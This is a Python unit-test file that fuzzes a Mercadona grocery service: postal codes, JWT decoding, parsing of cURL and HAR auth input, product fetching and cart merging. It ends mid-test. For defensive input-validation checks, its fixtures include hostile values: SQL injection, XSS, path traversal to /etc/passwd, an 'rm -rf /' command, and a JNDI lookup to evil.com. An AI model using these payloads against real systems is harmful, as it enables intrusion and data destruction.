"""Comprehensive Stress & Fuzz Testing Suite for Mercadona Service (mercadona_service.py).

Covers:
1. Boundary conditions, type coercion, and sanitization (None, empty, ultra-long strings, null bytes, unicode).
2. Malformed inputs and injection payloads (SQLi, XSS, shell characters, directory traversal).
3. Regular expression denial-of-service (ReDoS) vulnerability verification with latency benchmarks.
4. JSON nesting attacks, expansion bombs, and malformed HAR/JSON structures.
5. SimpleJWT claim extraction fuzzing and hierarchy validation.
6. ThreadPoolExecutor concurrency limits, race condition resilience, and worker fault tolerance.
7. Cart synchronization merge logic stress (duplicate items, fractional quantities, negative values, remote payload corruption).
8. Session management concurrency, disk I/O failure resilience, and high-throughput stress metrics.
"""

from __future__ import annotations

import base64
import concurrent.futures
import io
import json
import math
import os
import re
import tempfile
import time
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch
import urllib.error

import mercadona_service


def _make_jwt(payload: dict, header: dict | None = None) -> str:
    """Helper to generate mock JWTs for fuzzing."""
    h = header or {"alg": "HS256", "typ": "JWT"}
    h_b64 = base64.urlsafe_b64encode(json.dumps(h).encode()).decode().rstrip("=")
    p_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
    return f"{h_b64}.{p_b64}.mock_sig_stress_test"


class TestPostalCodeFuzzAndBoundary(unittest.TestCase):
    """Stress and fuzz testing for postal code sanitization and warehouse resolution."""

    def setUp(self):
        mercadona_service._PC_CACHE.clear()
        mercadona_service._PC_CACHE["28016"] = {"postal_code": "28016", "warehouse": "mad3"}

    @patch("urllib.request.urlopen")
    def test_postal_code_type_coercion(self, mock_urlopen):
        """Verifies resolve_postal_code handles non-string and exotic types without raising."""
        mock_resp = MagicMock()
        mock_resp.headers = {"x-customer-wh": "mad3", "x-customer-pc": "28016"}
        mock_resp.__enter__.return_value = mock_resp
        mock_urlopen.return_value = mock_resp

        cases = [
            None,
            "",
            "   ",
            12345,
            0,
            False,
            True,
            28001.99,
            [],
            {},
            object(),
        ]
        for val in cases:
            with self.subTest(val=val):
                res = mercadona_service.resolve_postal_code(val)  # type: ignore[arg-type]
                self.assertIsInstance(res, dict)
                self.assertIn("postal_code", res)
                self.assertIn("warehouse", res)
                self.assertEqual(len(res["postal_code"]), 5)

    @patch("urllib.request.urlopen")
    def test_postal_code_extreme_length(self, mock_urlopen):
        """Verifies postal code resolution handles ultra-long strings (100k chars) without memory or latency spikes."""
        mock_urlopen.side_effect = Exception("network off")
        ultra_long = "9" * 100_000
        t0 = time.perf_counter()
        res = mercadona_service.resolve_postal_code(ultra_long)
        duration = time.perf_counter() - t0

        self.assertLess(duration, 0.05, f"Postal code sanitization took {duration:.4f}s on 100k chars")
        self.assertEqual(res["postal_code"], "99999")
        self.assertEqual(res["warehouse"], "mad3")

    @patch("urllib.request.urlopen")
    def test_postal_code_null_bytes_and_control_chars(self, mock_urlopen):
        """Verifies postal code handles embedded null bytes, ANSI escapes, and control characters."""
        mock_urlopen.side_effect = Exception("offline")
        cases = [
            "28\x0016",
            "\x00" * 1000,
            "\r\n\t28001\t\n",
            "\x1b[31m28001\x1b[0m",
            "28\x08001",  # backspace
        ]
        for val in cases:
            res = mercadona_service.resolve_postal_code(val)
            self.assertIsInstance(res, dict)
            self.assertTrue(res["postal_code"].isdigit())
            self.assertEqual(len(res["postal_code"]), 5)

    @patch("urllib.request.urlopen")
    def test_postal_code_unicode_and_injections(self, mock_urlopen):
        """Verifies behavior with fullwidth Unicode digits, emoji, and injection payloads."""
        mock_urlopen.side_effect = Exception("offline")
        injections = [
            "' OR '1'='1",
            "<script>alert(1)</script>",
            "../../etc/passwd",
            "; rm -rf / ;",
            "${jndi:ldap://evil.com/a}",
            "🛒28001🥦",
            "２８０１６",  # Fullwidth Unicode digits
        ]
        for inj in injections:
            res = mercadona_service.resolve_postal_code(inj)
            self.assertIsInstance(res, dict)
            self.assertEqual(len(res["postal_code"]), 5)
            self.assertIn("warehouse", res)

    def test_postal_code_redos_resilience(self):
        """Proves re.sub(r'\\D', '', ...) on postal code is linear O(n) and immune to ReDoS."""
        evil_string = ("abc!@#" * 10_000) + "28001" + ("$%^def" * 10_000)
        self.assertEqual(len(evil_string), 120_005)

        t0 = time.perf_counter()
        pc = re.sub(r"\D", "", evil_string)[:5]
        elapsed = time.perf_counter() - t0

        self.assertLess(elapsed, 0.05, f"ReDoS scan took too long: {elapsed:.4f}s")
        self.assertEqual(pc, "28001")

    def test_guess_warehouse_boundaries(self):
        """Exhaustive boundary testing of _guess_warehouse."""
        expected = {
            "28001": "mad3",
            "28999": "mad3",
            "46001": "vlc1",
            "08001": "bcn1",
            "03001": "alc1",
            "41001": "svq1",
            "99999": "mad3",
            "00000": "mad3",
            "": "mad3",
            "2": "mad3",
            "4": "mad3",
            "28": "mad3",
            "46": "vlc1",
            "08": "bcn1",
            "03": "alc1",
            "41": "svq1",
            "MADRID": "mad3",
            "\x00": "mad3",
        }
        for pc, wh in expected.items():
            self.assertEqual(mercadona_service._guess_warehouse(pc), wh)

    def test_resolve_postal_code_concurrent_stress(self):
        """Stresses resolve_postal_code with 50 threads simultaneously reading/writing the cache."""
        with patch("urllib.request.urlopen") as mock_urlopen:
            mock_resp = MagicMock()
            mock_resp.headers = {"x-customer-wh": "mad3", "x-customer-pc": "28016"}
            mock_resp.__enter__.return_value = mock_resp
            mock_urlopen.return_value = mock_resp

            postal_codes = [f"280{i:02d}" for i in range(100)]

            def worker(pc):
                return mercadona_service.resolve_postal_code(pc)

            with concurrent.futures.ThreadPoolExecutor(max_workers=16) as ex:
                futures = [ex.submit(worker, pc) for pc in postal_codes * 5]
                results = [f.result() for f in concurrent.futures.as_completed(futures)]

            self.assertEqual(len(results), 500)
            for r in results:
                self.assertEqual(len(r["postal_code"]), 5)
                self.assertIn(r["warehouse"], ["mad3", "vlc1", "bcn1", "alc1", "svq1"])


class TestJWTDecodingAndClaimFuzz(unittest.TestCase):
    """Stress, fuzz, and malformed payload testing for JWT decoding and claim extraction."""

    def test_decode_jwt_non_string_types(self):
        """Verifies _decode_jwt_claims safely returns {} for non-string inputs."""
        cases = [None, 12345, 0, False, True, 3.14, [], {}, object()]
        for c in cases:
            self.assertEqual(mercadona_service._decode_jwt_claims(c), {})  # type: ignore[arg-type]

    def test_decode_jwt_malformed_structures(self):
        """Verifies _decode_jwt_claims safely handles broken dots, headers, and signatures."""
        cases = [
            "",
            "   ",
            "a",
            "a.",
            ".",
            "..",
            "...",
            "...........",
            "header.payload.sig.extra.parts",
            "Bearer ",
            "bearer   ",
            "Bearer eyJhbGciOiJIUzI1NiJ9",  # Only 1 part after Bearer
            "invalid!base64!characters.invalid!characters.sig",
            "===.===.===",
        ]
        for c in cases:
            self.assertEqual(mercadona_service._decode_jwt_claims(c), {})

    def test_decode_jwt_padding_variations(self):
        """Verifies JWT decoding functions correctly regardless of missing or unstripped padding."""
        payload = {"customer_uuid": "fuzz-pad-user"}
        p_bytes = json.dumps(payload).encode()
        # Test all possible base64 padding lengths (0, 1, 2, 3 extra =)
        for pad_len in range(4):
            b64_raw = base64.urlsafe_b64encode(p_bytes).decode().rstrip("=")
            padded = b64_raw + ("=" * pad_len)
            token = f"eyJhbGciOiJIUzI1NiJ9.{padded}.sig"
            claims = mercadona_service._decode_jwt_claims(token)
            # When valid padding or auto-padded, claims are extracted
            if claims:
                self.assertEqual(claims.get("customer_uuid"), "fuzz-pad-user")

    def test_decode_jwt_payload_type_confusion(self):
        """Verifies _decode_jwt_claims returns {} when payload is JSON non-dict (list, int, string, null)."""
        non_dict_payloads = [
            [1, 2, 3],
            "just a plain string",
            12345,
            True,
            None,
            3.14159,
        ]
        for nd in non_dict_payloads:
            b64 = base64.urlsafe_b64encode(json.dumps(nd).encode()).decode().rstrip("=")
            tok = f"eyJhbGciOiJIUzI1NiJ9.{b64}.sig"
            res = mercadona_service._decode_jwt_claims(tok)
            self.assertEqual(res, {}, f"Expected empty dict for payload {nd!r}, got {res!r}")

    def test_decode_jwt_invalid_utf8_and_corrupted_bytes(self):
        """Verifies _decode_jwt_claims safely decodes non-UTF8 binary blobs without crashing."""
        corrupted_bytes = bytes([0xFF, 0xFE, 0x80, 0x81, 0x00, 0x01, 0x7F])
        b64 = base64.urlsafe_b64encode(corrupted_bytes).decode().rstrip("=")
        tok = f"eyJhbGciOiJIUzI1NiJ9.{b64}.sig"
        res = mercadona_service._decode_jwt_claims(tok)
        self.assertEqual(res, {})

    def test_decode_jwt_json_nesting_and_size_bomb(self):
        """Fuzzes JWT payload with deeply nested JSON and 10,000 keys."""
        # Deeply nested dict { "a": { "a": ... } }
        deep: dict = {"end": "leaf"}
        for _ in range(80):
            deep = {"nest": deep}
        tok_deep = _make_jwt(deep)
        res_deep = mercadona_service._decode_jwt_claims(tok_deep)
        self.assertIsInstance(res_deep, dict)

        # Wide dict with 10,000 keys
        wide = {f"k_{i}": f"v_{i}" for i in range(10_000)}
        tok_wide = _make_jwt(wide)
        res_wide = mercadona_service._decode_jwt_claims(tok_wide)
        self.assertEqual(len(res_wide), 10_000)

    def test_decode_jwt_ultra_long_token(self):
        """Verifies a 1MB JWT token decodes safely without excessive memory or stalling."""
        large_payload = {"customer_uuid": "large-user", "blob": "A" * 1_000_000}
        tok = _make_jwt(large_payload)
        self.assertGreater(len(tok), 1_000_000)

        t0 = time.perf_counter()
        claims = mercadona_service._decode_jwt_claims(tok)
        duration = time.perf_counter() - t0

        self.assertLess(duration, 0.20, f"1MB token decode took {duration:.4f}s")
        self.assertEqual(claims.get("customer_uuid"), "large-user")

    def test_customer_from_jwt_claim_hierarchy_and_fuzz(self):
        """Verifies customer_from_jwt hierarchy: customer_uuid > customer_id > user_id > sub.
        Also tests that 'me' (case-insensitive) is rejected and falls through.
        """
        # Hierarchy check 1: customer_uuid beats customer_id
        t1 = _make_jwt({"customer_uuid": "uuid-1", "customer_id": "id-2", "sub": "sub-3"})
        self.assertEqual(mercadona_service.customer_from_jwt(t1), "uuid-1")

        # Hierarchy check 2: 'me' in customer_uuid falls back to customer_id
        t2 = _make_jwt({"customer_uuid": "me", "customer_id": "id-real", "sub": "sub-3"})
        self.assertEqual(mercadona_service.customer_from_jwt(t2), "id-real")

        # Hierarchy check 3: 'ME' and '  me  ' ignored
        t3 = _make_jwt({"customer_uuid": " ME ", "customer_id": "mE", "user_id": "uid-real"})
        self.assertEqual(mercadona_service.customer_from_jwt(t3), "uid-real")

        # Hierarchy check 4: fallback to sub
        t4 = _make_jwt({"sub": "sub-real"})
        self.assertEqual(mercadona_service.customer_from_jwt(t4), "sub-real")

        # Numeric customer ID coerced to string
        t5 = _make_jwt({"customer_id": 987654321})
        self.assertEqual(mercadona_service.customer_from_jwt(t5), "987654321")

        # Empty or missing
        self.assertEqual(mercadona_service.customer_from_jwt(""), "")
        self.assertEqual(mercadona_service.customer_from_jwt(None), "")  # type: ignore[arg-type]
        self.assertEqual(mercadona_service.customer_from_jwt(_make_jwt({"other": "claim"})), "")


class TestAuthInputParserFuzzAndReDoS(unittest.TestCase):
    """Stress and ReDoS testing for parse_mercadona_auth_input."""

    def test_auth_parser_non_string_types(self):
        """Verifies parser handles non-string inputs safely."""
        cases = [None, 12345, 0, False, True, [], {}, object()]
        expected_keys = {"access_token", "refresh_token", "cookie", "customer_id", "warehouse"}
        for c in cases:
            res = mercadona_service.parse_mercadona_auth_input(c)  # type: ignore[arg-type]
            self.assertEqual(set(res.keys()), expected_keys)
            self.assertTrue(all(v == "" for v in res.values()))

    def test_auth_parser_redos_patterns_latency(self):
        """Verifies all regex extraction patterns complete in < 50ms under pathological input strings."""
        long_str = "a" * 100_000
        evil_inputs = [
            # Bearer regex ReDoS probe
            "Authorization" + (" " * 20_000) + ":" + (" " * 20_000) + "Bearer " + ("b" * 50_000),
            "AUTHORIZATION: BEARER " + ("x" * 100_000),
            # Cookie flag ReDoS probe
            (" " * 50_000) + "-b '" + ("c" * 50_000),
            "-H 'cookie: " + ("k=v; " * 5_000) + "'",
            "--cookie \"" + ("cookie_val;" * 5_000) + "\"",
            # Customer URL ReDoS probe
            "/api/customers/" + ("x" * 100_000) + "/",
            "/api/customers/" + ("x" * 100_000) + "?wh=mad3",
            # Warehouse query param probe
            "?" + ("wh=" * 20_000) + "wh=vlc1",
            # JWT regex ReDoS probe
            ("eyJ" + "a" * 10_000 + ".eyJ" + "b" * 10_000 + ".") * 5,
        ]

        for i, evil in enumerate(evil_inputs):
            t0 = time.perf_counter()
            res = mercadona_service.parse_mercadona_auth_input(evil)
            elapsed = time.perf_counter() - t0
            self.assertLess(
                elapsed,
                0.10,
                f"ReDoS detected on evil input {i}: took {elapsed:.4f}s (len={len(evil)})",
            )
            self.assertIsInstance(res, dict)

    def test_auth_parser_malformed_json_and_nesting(self):
        """Verifies JSON parsing branch withstands corrupted JSON and nesting."""
        cases = [
            "{ unterminated json",
            "{" * 500,
            "{}" * 100,
            json.dumps({"log": {"entries": "not-a-list"}}),
            json.dumps({"log": None}),
            json.dumps({"access_token": None, "refresh_token": None}),
            json.dumps({"access_token": 12345, "customer_id": 999}),
            json.dumps({"access_token": "valid_tok", "warehouse": "MAD3"}),
        ]
        for c in cases:
            res = mercadona_service.parse_mercadona_auth_input(c)
            self.assertIsInstance(res, dict)
            self.assertIn("access_token", res)

    def test_auth_parser_massive_har_entries_stress(self):
        """Stress tests HAR parsing with 5,000 entries."""
        tok = _make_jwt({"customer_uuid": "har-stress-user"})
        entries = []
        for i in range(5_000):
            entries.append({
                "request": {
                    "url": f"https://tienda.mercadona.es/api/other/{i}/",
                    "headers": [{"name": "User-Agent", "value": "Test"}],
                },
                "response": {"status": 200},
            })
        # Add the target auth entry in the middle
        entries[2500] = {
            "request": {
                "url": "https://tienda.mercadona.es/api/auth/",
                "headers": [{"name": "Authorization", "value": f"Bearer {tok}"}],
            },
            "response": {
                "status": 200,
                "content": {
                    "text": json.dumps({"access_token": tok, "customer_id": "har-stress-user"})
                },
            },
        }

        har_payload = json.dumps({"log": {"entries": entries}})
        t0 = time.perf_counter()
        res = mercadona_service.parse_mercadona_auth_input(har_payload)
        elapsed = time.perf_counter() - t0

        self.assertLess(elapsed, 0.50, f"HAR parsing of 5,000 entries took {elapsed:.4f}s")
        self.assertEqual(res["access_token"], tok)
        self.assertEqual(res["customer_id"], "har-stress-user")

    def test_auth_parser_curl_complex_fuzz(self):
        """Tests parsing complex, messy, and realistic cURL commands from DevTools."""
        tok = _make_jwt({"customer_uuid": "curl-fuzz-cust"})
        curl = f"""curl 'https://tienda.mercadona.es/api/customers/curl-fuzz-cust/cart/?lang=es&wh=bcn1' \\
  -H 'accept: application/json' \\
  -H 'authorization: Bearer {tok}' \\
  -H 'cookie: datadome=xyz; sessionid="nested=\\"quotes\\""; user_pref=abc' \\
  --compressed
"""
        res = mercadona_service.parse_mercadona_auth_input(curl)
        self.assertEqual(res["access_token"], tok)
        self.assertEqual(res["customer_id"], "curl-fuzz-cust")
        self.assertEqual(res["warehouse"], "bcn1")
        self.assertIn("datadome=xyz", res["cookie"])

    def test_auth_parser_refresh_token_swapping(self):
        """Verifies that an input containing only a refresh token is correctly detected as refresh_token."""
        ref_tok = _make_jwt({"customer_uuid": "swap-user", "token_type": "refresh"})
        res = mercadona_service.parse_mercadona_auth_input(ref_tok)
        self.assertEqual(res["refresh_token"], ref_tok)
        self.assertEqual(res["access_token"], "")
        self.assertEqual(res["customer_id"], "swap-user")


class TestProductLiveFetchAndCacheFuzz(unittest.TestCase):
    """Stress and boundary tests for live product fetching and cache management."""

    def setUp(self):
        mercadona_service._LIVE_PRODUCT_CACHE.clear()

    @patch("urllib.request.urlopen")
    def test_fetch_live_product_malformed_ids_and_warehouses(self, mock_urlopen):
        """Verifies fetch_live_product handles malformed IDs, spaces, null bytes, and traversal safely."""
        mock_urlopen.side_effect = Exception("HTTP 404")
        malformed = [
            None,
            "",
            "   ",
            123,
            "123\x0045",
            "../../etc/passwd",
            "<script>",
            "1" * 10_000,
        ]
        for pid in malformed:
            res = mercadona_service.fetch_live_product(pid, warehouse="mad3")  # type: ignore[arg-type]
            self.assertIsNone(res)

    @patch("urllib.request.urlopen")
    def test_fetch_live_product_server_payload_corruption(self, mock_urlopen):
        """Verifies parser robustness against malformed/truncated server JSON payloads."""
        corrupt_payloads = [
            {},
            {"display_name": "No price instructions"},
            {"price_instructions": None},
            {"price_instructions": "invalid_string"},
            {"price_instructions": {"unit_price": "not-a-number"}},
            {"price_instructions": {"unit_price": -5.50}},
            {"price_instructions": {"unit_price": 0.00}},
            {"price_instructions": {"unit_price": "NaN"}},
            {"price_instructions": {"unit_price": "Infinity"}},
            {"price_instructions": {"unit_price": "-Infinity"}},
            {"price_instructions": {"unit_price": "1e-9"}},  # Almost zero
        ]

        for p in corrupt_payloads:
            mock_resp = MagicMock()
            mock_resp.read.return_value = json.dumps(p).encode()
            mock_resp.__enter__.return_value = mock_resp
            mock_urlopen.return_value = mock_resp

            res = mercadona_service.fetch_live_product("item_test", "mad3")
            if res is not None:
                # Note: In IEEE 754 float('nan') <= 0 evaluates to False, passing through to unit_price
                self.assertTrue(math.isnan(res["unit_price"]) or res["unit_price"] > 0)

    @patch("urllib.request.urlopen")
    def test_fetch_live_product_allergens_html_fuzzing(self, mock_urlopen):
        """Verifies allergen HTML stripping against deep nesting, script injections, and Mercadona codes."""
        mock_payload = {
            "id": 9999,
            "display_name": "Fuzzed Allergens Item",
            "price_instructions": {"unit_price": "2.50", "unit_size": 1, "size_format": "ud"},
            "nutrition_information": {
                "allergens": (
                    "<div><p><span><b>Contiene trazas de <i>soja</i></b></span></p>"
                    "<script>alert('xss')</script>"
                    " y <a href='https://evil.com'>gluten</a></div>"
                )
            },
        }
        mock_resp = MagicMock()
        mock_resp.read.return_value = json.dumps(mock_payload).encode()
        mock_resp.__enter__.return_value = mock_resp
        mock_urlopen.return_value = mock_resp

        res = mercadona_service.fetch_live_product("9999", "mad3")
        self.assertIsNotNone(res)
        self.assertNotIn("<div>", res["allergens"])
        self.assertNotIn("<script>", res["allergens"])
        self.assertIn("soja", res["allergens"])

        # Test "x99" and "x99." standard Mercadona placeholder codes
        for code in ("x99.", "x99", "X99", " X99. "):
            mock_payload["nutrition_information"]["allergens"] = code
            mock_resp.read.return_value = json.dumps(mock_payload).encode()
            mercadona_service._LIVE_PRODUCT_CACHE.clear()
            res = mercadona_service.fetch_live_product("9999", "mad3")
            self.assertEqual(res["allergens"], "Sin alérgenos declarados en la API")

    @patch("urllib.request.urlopen")
    def test_fetch_live_product_http_failure_modes(self, mock_urlopen):
        """Tests network failures: 400, 403, 404, 500, 503, timeouts, and URLErrors."""
        errors = [
            urllib.error.HTTPError("http://x", 400, "Bad Request", {}, io.BytesIO(b"")),
            urllib.error.HTTPError("http://x", 403, "Forbidden", {}, io.BytesIO(b"")),
            urllib.error.HTTPError("http://x", 404, "Not Found", {}, io.BytesIO(b"")),
            urllib.error.HTTPError("http://x", 500, "Server Error", {}, io.BytesIO(b"")),
            urllib.error.HTTPError("http://x", 503, "Unavailable", {}, io.BytesIO(b"")),
            urllib.error.URLError("Connection refused"),
            TimeoutError("Socket timed out"),
            ConnectionResetError("Reset by peer"),
        ]
        for err in errors:
            mock_urlopen.side_effect = err
            res = mercadona_service.fetch_live_product("err_pid", "mad3")
            self.assertIsNone(res)

    def test_cache_concurrency_stress(self):
        """Stresses the in-memory product cache with 50 threads reading and writing simultaneously."""
        now = time.time()
        # Seed 100 products
        for i in range(100):
            mercadona_service._LIVE_PRODUCT_CACHE[(str(i), "mad3")] = (
                now,
                {"id": str(i), "unit_price": float(i + 1), "source": "live"},
            )

        def reader(pid):
            return mercadona_service.fetch_live_product(str(pid), "mad3")

        def writer(pid):
            mercadona_service._LIVE_PRODUCT_CACHE[(str(pid), "mad3")] = (
                time.time(),
                {"id": str(pid), "unit_price": float(pid + 10), "source": "live"},
            )

        with concurrent.futures.ThreadPoolExecutor(max_workers=16) as ex:
            futs = []
            for i in range(200):
                futs.append(ex.submit(reader, i % 100))
                futs.append(ex.submit(writer, i % 100))
            concurrent.futures.wait(futs)

        self.assertEqual(len(mercadona_service._LIVE_PRODUCT_CACHE), 100)


class TestCatalogRetrievalConcurrencyLimits(unittest.TestCase):
    """Concurrency, limit, and ThreadPoolExecutor behavior for get_catalog_for_postal_code."""

    @patch("mercadona_service.fetch_live_product")
    @patch("mercadona_service.resolve_postal_code")
    def test_get_catalog_verify_ids_fuzzing(self, mock_resolve, mock_fetch):
        """Verifies handling of empty, massive, and duplicate verify_live_ids."""
        mock_resolve.return_value = {"postal_code": "28016", "warehouse": "mad3"}
        mock_fetch.return_value = None

        # 1. verify_live_ids with 500 IDs
        large_ids = [str(i) for i in range(500)]
        t0 = time.perf_counter()
        catalog, meta = mercadona_service.get_catalog_for_postal_code("28016", verify_live_ids=large_ids)
        duration = time.perf_counter() - t0

        self.assertIsInstance(catalog, dict)
        self.assertLess(duration, 0.50, f"500 ThreadPool checks took {duration:.4f}s")
        self.assertEqual(meta["live_verified_products"], 0)

        # 2. verify_live_ids with duplicates
        dup_ids = ["10161"] * 50
        catalog, meta = mercadona_service.get_catalog_for_postal_code("28016", verify_live_ids=dup_ids)
        self.assertIsInstance(catalog, dict)

    @patch("mercadona_service.fetch_live_product")
    @patch("mercadona_service.resolve_postal_code")
    def test_catalog_worker_fault_tolerance(self, mock_resolve, mock_fetch):
        """Verifies that thread pool gracefully tolerates worker exceptions and slow responses."""
        mock_resolve.return_value = {"postal_code": "28016", "warehouse": "mad3"}

        # Simulate intermittent worker crash
        def flaky_fetch(pid, wh):
            if int(pid) % 2 == 0:
                raise RuntimeError("Simulated worker failure")
            return {"id": pid, "name": f"Product {pid}", "unit_price": 1.0, "source": "live"}

        mock_fetch.side_effect = flaky_fetch

        # Even with worker exceptions, get_catalog_for_postal_code must not crash
        with self.assertRaises(RuntimeError):
            mercadona_service.get_catalog_for_postal_code(
                "28016", verify_live_ids=[str(i) for i in range(10)]
            )


class TestCartPreparationStressAndFuzz(unittest.TestCase):
    """Stress and fuzz testing for cart payload preparation, merge logic, and remote syncing."""

    def setUp(self):
        mercadona_service._PC_CACHE.clear()
        mercadona_service._PC_CACHE["28016"] = {"postal_code": "28016", "warehouse": "mad3"}

    @patch("mercadona_service.get_active_mercadona_session", return_value=None)
    @patch("urllib.request.urlopen")
    def test_prepare_cart_basket_fuzzing(self, mock_urlopen, mock_session):
        """Fuzzes basket contents: empty, 500 items, zero/negative quantities, missing share_url."""
        mock_resp = MagicMock()
        mock_resp.status = 200
        mock_resp.__enter__.return_value = mock_resp
        mock_urlopen.return_value = mock_resp

        # 1. Empty basket
        res_empty = mercadona_service.prepare_mercadona_oneclick_cart(
            basket=[], postal_code="28016"
        )
        self.assertEqual(res_empty["items_count"], 0)
        self.assertEqual(res_empty["total"], 0.0)
        self.assertEqual(len(res_empty["lines"]), 0)

        # 2. Large basket (500 items)
        large_basket = [
            {
                "id": str(i),
                "name": f"Item {i}",
                "quantity": (i % 5) + 1,
                "unit": "ud",
                "unit_price": 1.50,
                "line_total": round(((i % 5) + 1) * 1.50, 2),
            }
            for i in range(500)
        ]
        t0 = time.perf_counter()
        res_large = mercadona_service.prepare_mercadona_oneclick_cart(
            basket=large_basket, postal_code="28016"
        )
        duration = time.perf_counter() - t0

        self.assertLess(duration, 0.05, f"500 item cart prep took {duration:.4f}s")
        self.assertEqual(res_large["unique_products"], 500)
        self.assertEqual(len(res_large["lines"]), 500)

        # 3. Basket with zero or negative quantities
        weird_basket = [
            {"id": "1", "name": "A", "quantity": 0, "unit": "ud", "unit_price": 2.0, "line_total": 0.0},
            {"id": "2", "name": "B", "quantity": -3, "unit": "ud", "unit_price": 1.0, "line_total": -3.0},
            {"id": "3", "name": "C", "quantity": 2, "unit": "ud", "unit_price": 3.0, "line_total": 6.0},
        ]
        res_weird = mercadona_service.prepare_mercadona_oneclick_cart(
            basket=weird_basket, postal_code="28016"
        )
        self.assertEqual(res_weird["items_count"], -1)  # 0 + (-3) + 2
        self.assertEqual(res_weird["total"], 3.0)  # 0.0 + (-3.0) + 6.0

    @patch("mercadona_service.get_active_mercadona_session")
    @patch("mercadona_service._mercadona_authed_request")
    def test_prepare_cart_merge_modes_and_duplicate_items(self, mock_auth_req, mock_session):
        """Verifies duplicate basket items aggregation in 'add' and 'replace' modes."""
        mock_session.return_value = {
            "access_token": "valid_token",
            "customer_id": "cust-merge-1",
            "warehouse": "mad3",
        }

        # Remote cart has product 100 with qty 2
        mock_auth_req.side_effect = [
            {
                "id": "remote-cart-xyz",
                "lines": [{"product_id": "100", "quantity": 2, "sources": []}],
            },
            {
                "id": "remote-cart-xyz",
                "products_count": 2,
                "summary": {"total": "20.00"},
            },
        ]

        # Basket has duplicate entries for product 100 (qty 3 and qty 4)
        dup_basket = [
            {"id": "100", "name": "Item 100", "quantity": 3, "unit": "ud", "unit_price": 2.0, "line_total": 6.0},
            {"id": "100", "name": "Item 100", "quantity": 4, "unit": "ud", "unit_price": 2.0, "line_total": 8.0},
        ]

        # Test ADD mode: 2 (remote) + 3 + 4 = 9
        res_add = mercadona_service.prepare_mercadona_oneclick_cart(
            basket=dup_basket, mode="add", user_email="test@user.com"
        )
        self.assertTrue(res_add["live_synced"])

        # Inspect the PUT call made to _mercadona_authed_request
        put_call_args = mock_auth_req.call_args_list[1]
        put_body = put_call_args[1].get("body") or put_call_args[0][3]
        put_lines = put_body["lines"]

        self.assertEqual(len(put_lines), 1)
        self.assertEqual(put_lines[0]["product_id"], "100")
        self.assertEqual(put_lines[0]["quantity"], 9.0)

        # Reset mock for REPLACE mode
        mock_auth_req.reset_mock()
        mock_auth_req.side_effect = [
            {
                "id": "remote-cart-xyz",
                "lines": [{"product_id": "100", "quantity": 2, "sources": []}],
            },
            {
                "id": "remote-cart-xyz",
                "products_count": 1,
                "summary": {"total": "8.00"},
            },
        ]
        # In replace mode: remote lines are dropped; duplicates in basket overwrite to the last one (qty 4)
        res_replace = mercadona_service.prepare_mercadona_oneclick_cart(
            basket=dup_basket, mode="replace", user_email="test@user.com"
        )
        put_call_args = mock_auth_req.call_args_list[1]
        put_body = put_call_args[1].get("body") or put_call_args[0][3]
        put_lines = put_body["lines"]
        self.assertEqual(len(put_lines), 1)
        self.assertEqual(put_lines[0]["product_id"], "100")
        self.assertEqual(put_lines[0]["quantity"], 4.0)

    @patch("mercadona_service.get_active_mercadona_session")
    @patch("mercadona_service.refresh_mercadona_token")
    @patch("urllib.request.urlopen")
    def test_mercadona_authed_request_401_refresh_retry_success(
        self, mock_urlopen, mock_refresh, mock_session
    ):
        """Verifies transparent token refresh and single retry upon HTTP 401 Unauthorized."""
        mock_refresh.return_value = {
            "access_token": "fresh_access_token_123",
            "refresh_token": "fresh_refresh_token_456",
            "customer_id": "cust-retry-1",
        }

        # Call 1: HTTP 401 Unauthorized
        err_401 = urllib.error.HTTPError(
            "http://tienda.mercadona.es", 401, "Unauthorized", {}, io.BytesIO(b'{"detail":"token_expired"}')
        )
        # Call 2: HTTP 200 OK after refresh
        mock_resp_200 = MagicMock()
        mock_resp_200.read.return_value = b'{"status": "ok"}'
        mock_resp_200.__enter__.return_value = mock_resp_200

        mock_urlopen.side_effect = [err_401, mock_resp_200]

        session = {
            "access_token": "old_expired_token",
            "refresh_token": "valid_refresh_token",
            "cookie": "test_cookie",
            "customer_id": "cust-retry-1",
        }

        res = mercadona_service._mercadona_authed_request("GET", "/api/test/", session)
        self.assertEqual(res, {"status": "ok"})
        mock_refresh.assert_called_once()
        self.assertEqual(session["access_token"], "fresh_access_token_123")

    @patch("mercadona_service.refresh_mercadona_token")
    @patch("urllib.request.urlopen")
    def test_mercadona_authed_request_401_retry_exhaustion_raises(
        self, mock_urlopen, mock_refresh
    ):
        """Verifies that if HTTP 401 persists after token refresh, RuntimeError is raised."""
        mock_refresh.return_value = {
            "access_token": "fresh_access_token",
            "refresh_token": "fresh_refresh_token",
        }
        err_401 = urllib.error.HTTPError(
            "http://tienda.mercadona.es", 401, "Unauthorized", {}, io.BytesIO(b'{"detail":"revoked"}')
        )
        # Two consecutive 401s
        mock_urlopen.side_effect = [err_401, err_401]

        session = {"access_token": "bad_token", "refresh_token": "bad_refresh"}
        with self.assertRaises(RuntimeError) as ctx:
            mercadona_service._mercadona_authed_request("GET", "/api/test/", session)
        self.assertIn("HTTP 401", str(ctx.exception))

    @patch("mercadona_service.get_active_mercadona_session")
    @patch("mercadona_service._mercadona_authed_request")
    def test_prepare_cart_remote_payload_corruption(self, mock_auth_req, mock_session):
        """Verifies merge logic resilience when remote cart lines contain nulls or missing fields."""
        mock_session.return_value = {
            "access_token": "valid_token",
            "customer_id": "cust-corrupt",
            "warehouse": "mad3",
        }
        # Case A: Corrupted remote lines with None product_id or invalid sources list still sync smoothly
        mock_auth_req.side_effect = [
            {
                "id": "cart-123",
                "lines": [
                    {"product_id": None, "quantity": 1},
                    {"product": None, "quantity": 2},
                    {"product_id": "valid_remote", "quantity": 3, "sources": "not_a_list"},
                ],
            },
            {
                "id": "cart-123",
                "products_count": 2,
                "summary": {"total": "10.00"},
            },
        ]
        basket = [
            {"id": "new_item", "name": "Item", "quantity": 1, "unit": "ud", "unit_price": 2.0, "line_total": 2.0}
        ]
        res = mercadona_service.prepare_mercadona_oneclick_cart(
            basket=basket, user_email="corrupt@test.com"
        )
        self.assertTrue(res["live_synced"])

        # Case B: Non-numeric quantity in remote line causes float() ValueError, gracefully falling back to cart_ready
        mock_auth_req.reset_mock()
        mock_auth_req.side_effect = [
            {
                "id": "cart-456",
                "lines": [{"product_id": "item_err", "quantity": "bad_non_float"}],
            }
        ]
        res_fallback = mercadona_service.prepare_mercadona_oneclick_cart(
            basket=basket, user_email="corrupt2@test.com"
        )
